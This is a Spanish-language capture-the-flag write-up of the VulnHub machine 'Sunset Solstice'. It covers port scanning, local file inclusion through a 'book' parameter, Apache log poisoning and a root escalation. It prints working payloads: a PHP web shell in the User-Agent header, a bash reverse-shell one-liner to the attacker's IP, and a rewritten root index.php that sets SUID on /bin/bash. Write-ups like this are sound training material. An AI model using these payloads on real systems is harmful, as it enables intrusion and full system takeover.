---
layout: single
title: Sunset Solstice - VulnHub
excerpt: " In this machine, we will learn about LFI (Local File Inclusion) and How to create an exploit or poisoning via apache `access.log` (apache log poisoning through lfi). For Privilege Escalation is how to change `index.php` codes to PHP simple reverse shell script on the webserver."
date: 2023-04-22
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-solstice/solstice.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - Path Traversal
  - Apache
  - Log Poisoning
  - Internal Web Server
  - PHP
---

In this machine, we will learn about LFI (Local File Inclusion) and How to create an exploit or poisoning via apache `access.log` (apache log poisoning through lfi). For Privilege Escalation is how to change `index.php` codes to PHP simple reverse shell script on the webserver.

# Summary
- IP: 192.168.1.5
- Ports: 21,22,25,80,139,445,2121,3128,8593,54787,62524
- OS: Linux (Ubuntu)
- Services & Applications:

```js
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         pyftpdlib 1.5.6
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp    open  smtp        Exim smtpd 4.92
80/tcp    open  http        Apache httpd 2.4.38 ((Debian))
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
2121/tcp  open  ftp         pyftpdlib 1.5.6
3128/tcp  open  http-proxy  Squid http proxy 4.6
8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
62524/tcp open  ftp         FreeFloat ftpd 1.00
```

<br><br>
# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.1.5 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p21,22,25,80,139,445,2121,3128,8593,54787,62524 -sCV 192.168.1.5 -oN targeted
```

<br><br>
# Análisis de página web (Port 80):

- En la página web principal de este puerto no encontramos nada interesante.
<br><br>
# Análisis de página web (Port 8593):

- Dentro de aquí podemos observar dos enlaces con las etiquetas "Main Page" y "Book List", si hacemos click en la primera no nos lleva a nada, sin embargo, si hacemos click en "Book List" podemos darnos cuenta que en el enlace está usando un parámetro "book" para apuntar a un recurso "list", intentamos hacer un `PATH TRAVERSAL` para verificar si podemos enumerar recursos de la máquina víctima:

```
http://192.168.1.5:8593/index.php?book=../../../../../etc/passwd
```

- Efectivamente nos muestra el contenido del "/etc/passwd" así que ahora buscamos la manera de aprovechar este LFI y derivarlo a un RCE.
<br><br>
# Log Poisoning Apache:

- Buscamos el archivo de configuración de apache:

```
http://192.168.1.5:8593/index.php?book=../../../../../var/log/apache2/access.log
```

- Y sí que nos muestra los registros del log de las sesiones del servidor Apache, así que podemos usar esto para ganar un `RCE` haciendo `LOG POISONING`.

- Primero debemos confirmar a qué puerto este log está haciendo referencia, así que hacemos una petición usando el navegador, primero hacia la página web principal del puerto 80.

```
http://192.168.1.5/Holaaaaaaaaaa
```

- Ahora recargamos la página del log de apache y al final de todo deberíamos ver la petición que hicimos, y en este caso sí que nos muestra la petición al recurso de ejemplo "Holaaaaaaaaaa", por lo que podemos confirmar que el `log de Apache` está tomando registro de las peticiones hechas al puerto 80.

- Sabiendo esto, abrimos Burpsuite y mandamos la misma petición del puerto 80 al Repeater y, como en el log de apache se nos muestra como parte del Output el "User-agent", usando Burpsuite lo modificaremos inyectando código PHP el cual será interpretado ya que en la URL podemos evidenciar que el recurso que estamos usando para abrir el log se deriva del recurso "index.php", lo que nos dice que cualquier código PHP que logremos inyectar, se interpretaría.

- Dentro del repeater de Burpsuite, con la petición hecha, modificamos el `user-agent` por lo siguiente:

```js
User-Agent: <?php system($_GET['cmd']); ?>
```

- Hecho esto, le damos en "send" para realizar la petición y ahora si nos dirigimos al recurso del log de `apache` y apuntamos al parámetro "cmd" nos debería permitir ejecutar comandos del sistema:

```
view-source:http://192.168.1.5:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=ls -l /
```
- Confirmado esto lo que resta por hacer es entablar una `reverse shell` y ganar acceso al sistema.


```
view-source:http://192.168.1.5:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.35/443 0>%261"
```
<br><br>

# ESCALANDO PRIVILEGIOS:

- Verificamos `permisos SUID`:

```bash
$find / -perm -4000 2>/dev/null
```

```js
/var/tmp/sv
/var/tmp/ftp
/var/tmp/ftp/pub
```

<br><br>
# Servidor web interno:

- Sospechamos de estos directorios que no son comunes de ver con permisos `SUID`, así que revisamos el primero:

```bash
$cd /var/tmp/sv/
$ls
```

```js
index.php
```

- Vemos que hay un recurso "index.php" por lo que podríamos sospechar que se trata de un `servidor web`; si revisamos permisos vemos que el propietario de dicho recurso es "root" y podemos modificarlo dado que tiene permisos SUID.

- Buscamos indicios de que se trate de un servidor web interno montado en la máquina buscando entre todos los procesos:

```bash
$ps faux | grep "/var/tmp/sv"
```

```js
www-data  1221  0.0  0.0   6076   884 pts/0    S+   13:54   0:00  |                                   \_ grep /var/tmp/sv
root       354  0.0  0.0   2388   692 ?        Ss   13:23   0:00      \_ /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
root       394  0.0  2.0 196744 21164 ?        S    13:23   0:00          \_ /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
```

- Podemos notar en la segunda linea como un proceso iniciado por "root" ejecuta un `servidor php` en el puerto 57 usando los recursos del directorio en el que estamos.

- Sabiendo esto, lo que podemos hacer es modificar el "index.php" inyectando código `php` que nos ejecute un comando determinado dentro del sistema, ya que al acceder a dicho recurso del servidor web interno, dicho comando que inyectaremos se ejecutará como "root":

```bash
$cat index.php 
```

```js
<?php system("chmod u+s /bin/bash"); ?>
```

- Ahora accedemos al recurso usando "curl" apuntando al puerto "57" que es en donde se encuentra alojado el servidor interno:

```bash
$curl "http://127.0.0.1:57"
```

- Hecho esto la bash ya debería tener permisos `SUID` y podemos ejecutarla con privilegios para acceder como el usuario root:

```bash
$ls -la /bin/bash
```

```js
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

```bash
$bash -p
```
